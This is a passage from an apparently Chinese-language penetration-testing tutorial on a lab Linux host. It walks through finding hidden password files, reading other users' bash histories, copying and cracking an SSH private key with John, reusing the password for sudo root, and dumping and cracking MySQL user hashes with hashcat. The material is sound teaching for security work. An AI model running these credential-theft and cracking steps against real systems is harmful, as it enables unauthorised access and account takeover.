d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849912-814566446-20e7c99a83074acd605adf0ae81ce2e0.png" width="773" height="530" class="img_ev3q"></p>
<p>这里我们可以看到文件系统根目录中有两个非标准文件夹，其中一个是隐藏文件夹：<strong>.important</strong></p>
<blockquote>
<p>share 目录是另一个非标准目录，它是另一篇文章的一部分，该文章展示了如何从 NFS 共享提升权限。</p>
</blockquote>
<p>由于 <strong>.important</strong> 目录是隐藏的且由当前用户拥有，因此这是一个值得仔细研究的有趣目录。</p>
<p>导航到隐藏目录并再次使用 <strong>ls -la</strong> 命令，我们可以看到有一个名为 <strong>.password</strong> 的隐藏文件；在里面，我们找到另一个可以添加到密码文件本中的密码。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849315-1254012681-4a4f4d65d6d3719e9ddddf5c3ed65cb5.png" width="428" height="140" class="img_ev3q"></p>
<p><strong>Password123！</strong></p>
<p>我们应该始终记得在文件系统根目录下寻找非标准目录；不过，有两个已知的隐藏文件/文件夹存在于每个用户的主目录中，它们是 .bash_history 文件和 .ssh 文件夹。.bash_history 文件存在于每个用户的主目录中，但 .ssh 文件夹只有在用户拥有 SSH 密钥时才会存在。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32bash-历史文件中的密码"><strong><div id="id3.2">3.2、Bash 历史文件中的密码</div></strong><a href="#32bash-历史文件中的密码" class="hash-link" aria-label="32bash-历史文件中的密码的直接链接" title="32bash-历史文件中的密码的直接链接">​</a></h4>
<p>.bash_history 文件是一个存储用户在命令提示符下输入的命令历史记录的文件，用于查看已执行过的旧命令。用户当前会话会将命令历史保存到内存中，可以使用历史命令查看。但一旦用户注销，内存中的命令就会保存到 .bash_history 文件中。</p>
<p>当我们在目标上站稳脚跟后，我们要做的事情之一就是列举系统中拥有 home 配置文件的用户数量，以及在我们找到的所有配置文件中，有多少我们可以查看的 bash 历史文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849873-439094557-ca0dd66a63f878fbb5e6fcc76eeda00b.png" width="534" height="143" class="img_ev3q"></p>
<p>该系统有三个用户配置文件：<strong>cain、devops、juggernaut</strong></p>
<p>检查了三个 home 配置文件后，我们发现无法查看 devops 用户的 .bash_history 文件；但是，我们可以查看当前用户 cain 和 juggernaut 的！</p>
<p>尝试查看每个用户的 bash 历史文件的内容时，我们在自己的文件中没有发现太多值得关注的内容，但是在 juggernaut 里发现了一些有趣的东西。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849485-602438070-744849cb640da996fa9a7dc48f580974.png" width="572" height="352" class="img_ev3q"></p>
<p>命令历史记录告诉我们，用户尝试通过在命令行上直接传递 root 凭据来登录 MySQL 服务器。</p>
<p>由于我们已经在 config.php 文件中找到了这些凭据，因此我们知道这些凭据可以让我们进入 MySQL 服务器，在那里我们可以枚举出更多密码哈希值！</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="33ssh-密钥密码"><strong><div id="id3.3">3.3、SSH 密钥密码</div></strong><a href="#33ssh-密钥密码" class="hash-link" aria-label="33ssh-密钥密码的直接链接" title="33ssh-密钥密码的直接链接">​</a></h4>
<p>当我们枚举不同的用户配置文件时，我们可能会遇到一个包含 SSH 密钥的隐藏文件夹！这通常名为 <strong>.ssh</strong>，可以使用 <strong>ls-la</strong> 找到。</p>
<p>检查 juggernaut 的 home 文件夹，我们发现有一个 .ssh 目录，里面存在一个 id_rsa 文件并且我们有读取权限！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140852389-573847591-8f2c49ed41d09876e8977ecd0cae6f61.png" width="726" height="786" class="img_ev3q"></p>
<p>id_rsa 文件是一个私钥，可用于在不知道用户密码的情况下登录 SSH，但前提是在创建密钥时没有设置密码。就进入系统而言，此文件本质上相当于密码。</p>
<p>由于我们有此文件的读取权限，因此可以使用 cat 命令显示文件的内容，然后将其完整复制到攻击机器。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140855516-943171039-bd295aa6c4e35a97012cb3206e4174a9.png" width="535" height="509" class="img_ev3q"></p>
<p>在我们的攻击者机器上</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140859369-1105726168-9e27438d0e2c3808185c35ba650fcaa5.png" width="536" height="561" class="img_ev3q"></p>
<p>Perfect！我们已将 juggernaut 的密钥复制到攻击者的机器上，现在可以使用它登录了。在登录之前，我们还需要将私钥文件的权限设置为 <strong>600</strong>。</p>
<blockquote>
<p>如果不将权限设置为 600，私钥将无法使用。因为 ssh 限定必须如此，以此来提高该文件的安全性。</p>
</blockquote>
<p>不幸的是，当我们尝试登录时，系统提示我们输入私钥的密码。这意味着在最开始创建私钥文件时确实设置了密码。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod 600 juggernaut_id_rsa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ssh -i ./juggernaut_id_rsa juggernaut@172.16.1.175</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849809-1842647990-19f486d14b56838684f7fa4443814368.png" width="459" height="105" class="img_ev3q"></p>
<p>幸运的是，我们可以使用一个工具将密钥转换为可破解的 hash 格式，然后尝试使用 <strong>John</strong> 来破解它。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="331使用-john-破解-ssh-密钥密码"><strong><div id="id3.3.1">3.3.1、使用 John 破解 SSH 密钥密码</div></strong><a href="#331使用-john-破解-ssh-密钥密码" class="hash-link" aria-label="331使用-john-破解-ssh-密钥密码的直接链接" title="331使用-john-破解-ssh-密钥密码的直接链接">​</a></h6>
<p>对于大多数受密码保护的文件类型，John 拥有不同的工具可用于将特定文件类型转换为可破解的格式。这些工具都名为 <strong>xxx2john</strong>，可以使用以下命令在攻击者机器上找到整个列表：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">locate *2john</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>使用上述命令，您将看到有很多文件类型可以用 John 破解，其中也包括 “SSH” 文件格式。</p>
</blockquote>
<p>由于我们要破解的是 SSH 密钥，因此可以使用 <strong>ssh2john</strong> 将私钥文件转换为可破解格式。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ssh2john juggernaut_id_rsa &gt; jugg.john</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140854581-1942365936-cf58ebb29f3c382d780b676d18809189.png" width="1011" height="448" class="img_ev3q"></p>
<p>将输出重定向到文件后，我们可以看到文件已被格式化，以便破解。现在我们可以尝试使用 John 和 rockyou.txt 单词表来破解密码。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john jugg.john --wordlist=/usr/share/wordlists/rockyou.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140850370-1619154282-223f81c1ce939ffe9168e1fd773dc4e6.png" width="758" height="206" class="img_ev3q"></p>
<p>一瞬间，John 就破解了密码：  <strong>P@ssw0rd</strong></p>
<p>现在我们可以使用该密码尝试通过 SSH 登录受害者。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140850243-758262665-a40d8d0f55fec336b55d4b3bfabd65b2.png" width="546" height="260" class="img_ev3q"></p>
<p>Amazing！我们成功了！</p>
<p>在以新用户身份站稳脚跟后，我们需要再次开始手动枚举，首先要运行的命令之一是 sudo -l，以查看该用户是否有能力以 root 用户身份运行任何程序。</p>
<p>当我们运行 <strong>sudo -l</strong> 时，系统会提示我们输入密码。由于密码重用非常常见，因此我们可以测试用户在其 SSH 密钥上设置的密码。如果幸运的话，他们在制作密钥时会重用他们实际的登录密码。</p>
<p>输入 “P@ssw0rd” 作为密码，我们可以看到用户确实重复使用了他们的密码，而且我们拥有了完全的 sudo 访问权限！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849160-1387560694-786c7d05e1e3fb11092d2e3d19f5a92b.png" width="566" height="76" class="img_ev3q"></p>
<p>看到 <strong>(ALL) ALL</strong> 意味着通过该用户，我们拥有完全的 root 访问权限！要提升为 root 用户，我们只需运行 sudo su - 就可以了。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849363-690289704-f9a6051f3249be02b6b324681f8103f7.png" width="348" height="78" class="img_ev3q"></p>
<p>BOOM！由于密码重复使用，升级将变得微不足道！</p>
<blockquote>
<p>您可能已经注意到，第二次运行 sudo 时没有提示我输入密码。这是因为默认情况下，sudo 仅在 5 分钟不活动后才会提示您输入密码。每次运行 sudo 时，它都会重置 5 分钟计时器，并允许使用 sudo 而无需再次输入密码。</p>
</blockquote>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4密码搜寻--mysql"><strong><div id="id4">4、密码搜寻 – MySQL</div></strong><a href="#4密码搜寻--mysql" class="hash-link" aria-label="4密码搜寻--mysql的直接链接" title="4密码搜寻--mysql的直接链接">​</a></h2>
<p>之前我们在位于 webroot (/var/www) 的 <strong>config.php</strong> 文件中找到了 MySQL 的 root 凭据，同时也在 <strong>juggernaut</strong> 用户的 <strong>.bash_history</strong> 文件中找到了相同的凭据。</p>
<p>让我们登入 MySQL 并枚举数据库和表，如果幸运的话，我们可能会找到 Web 应用程序以及 MySQL 自身的用户名和密码。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql -u root -p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849313-160709160-ec57fcf1c554a8efc825ec9d6ac28620.png" width="643" height="259" class="img_ev3q"></p>
<p>Awesome！我们已进入了 MySQL，现在可以开始枚举数据库了。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">show databases;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140848490-526008116-a59cb67972871c5ea1909fd8f33f8526.png" width="216" height="203" class="img_ev3q"></p>
<p>前四个数据库是默认内置的数据库，在这四个数据库当中，我们最感兴趣的是 mysql 数据库，因为这个数据库包含了可以让我们进入 MySQL 的登录凭据。</p>
<p>除了默认数据库之外，我们始终应该对自定义数据库感兴趣，因为自定义数据库通常会与 Web 应用程序相关联。如果我们在这里找到一些密码哈希值，也许就能破解它们，并利用它们来增加我们的访问权限。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="41内置数据库中的密码哈希值--mysql"><strong><div id="id4.1">4.1、内置数据库中的密码哈希值 – MySQL</div></strong><a href="#41内置数据库中的密码哈希值--mysql" class="hash-link" aria-label="41内置数据库中的密码哈希值--mysql的直接链接" title="41内置数据库中的密码哈希值--mysql的直接链接">​</a></h4>
<p>在 mysql 数据库中，我们可以使用 use 命令切换当前使用的数据库，然后使用 show 命令查看所有表，其中最令人感兴趣的是该数据库中的用户表。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use mysql;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show tables;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849614-282576217-9a0ffecedeeca8d8927402d48957b65e.png" width="547" height="704" class="img_ev3q"></p>
<p>现在我们知道要查看哪个表了，可以使用以下命令转储所有行和列：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">select * from user;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849977-1108321826-fbdfedee3c1d8fde8f340cf92c6b889a.png" width="836" height="560" class="img_ev3q"></p>
<p>这里有两个哈希值。不过，root 哈希值是我们用来进入 MySQL 的密码的哈希值，这是因为 <strong>数据库 mysql</strong> 保存着 MySQL 服务运行相关的状态、用户等信息。我们可以使用以下命令检查密码是否相同：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">select password(&#x27;SuperS3cureP@ssw0rd&#x27;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849654-1041493868-0a91cda82531a036ab73b245f4755c16.png" width="391" height="132" class="img_ev3q"></p>
<p>此命令会将传递的字符串转换为哈希值。可以看到，user 表中 root 用户的密码哈希与我们用于登录 MySQL 的密码的哈希是相同的。但是，我们找到的 dev 用户的哈希是唯一的，因此我们可以将此哈希复制到攻击者机器上的 TXT 文件中，然后使用 hashcat 对其进行破解。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="411使用-hashcat-破解-mysql-哈希"><strong><div id="id4.1.1">4.1.1、使用 Hashcat 破解 mysql 哈希</div></strong><a href="#411使用-hashcat-破解-mysql-哈希" class="hash-link" aria-label="411使用-hashcat-破解-mysql-哈希的直接链接" title="411使用-hashcat-破解-mysql-哈希的直接链接">​</a></h6>
<p>当我们把这个哈希值复制到攻击者的机器上时，我们需要把前面的 &quot;*&quot;去掉，就像这样：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;D37C49F9CBEFBF8B6F4B165AC703AA271E079004&#x27; &gt; mysql.hash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在，当前目录中有一个名为 <strong>mysql.hash</strong> 的文件，我们可以将其传递给 <strong>hashcat</strong> 来破解此哈希。开始破解之前，我们需要使用以下命令找到此哈希类型的破解模式：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -h | grep -i &#x27;mysql&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849910-472466959-7c2acfddf8e91452d3357186359aaafa.png" width="656" height="145" class="img_ev3q"></p>
<p>Perfect！在这里我们可以看到需要使用的破解模式是 300，剩下要做的就是把它们组合在一起然后破解这个哈希。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -m 300 ./mysql.hash /usr/share/wordlists/rockyou.txt -o cracked.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140851781-1891403143-ef5582bdc2da4d8ffa734bce64bf4cce.png" width="600" height="302" class="img_ev3q"></p>
<p>一秒钟，我们就破解了哈希！现在我们需要从输出结果的 <strong>cracked.txt</strong> 文件中查看密码。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849192-1407276518-3b00fa694825425cac185af2fd1608fe.png" width="407" height="63" class="img_ev3q"></p>
<p>就这样，我们的密码本中又新增了一个新密码：<strong>letmein</strong>。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="42自建数据库中的密码哈希值--md5"><strong><div id="id4.2">4.2、自建数据库中的密码哈希值 – MD5</div></strong><a href="#42自建数据库中的密码哈希值--md5" class="hash-link" aria-label="42自建数据库中的密码哈希值--md5的直接链接" title="42自建数据库中的密码哈希值--md5的直接链接">​</a></h6>
<p>现在我们将注意力转向自定义数据库 <strong>web_app</strong> 数据库。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use web_app;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show tables;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849247-1201694245-a0710e97366b990b7d02f12952ce248a.png" width="550" height="235" class="img_ev3q"></p>
<p>在这里我们注意到有两个表引起了我们的兴趣：<strong>users、passwd</strong>，让我们先转储 users 表。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">select * from users;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849344-68508277-6039f0f016ae4156ef78c2b4e3c3809c.png" width="439" height="142" class="img_ev3q"></p>
<p>该表有两个用户名和密码哈希值。由于该数据库与网络应用程序绑定，因此破解这些哈希值很可能会让我们以不同用户的身份登录 Web 应用程序。但这也在意料之中，因为密码的重复使用，我们还可以测试其他地方。</p>
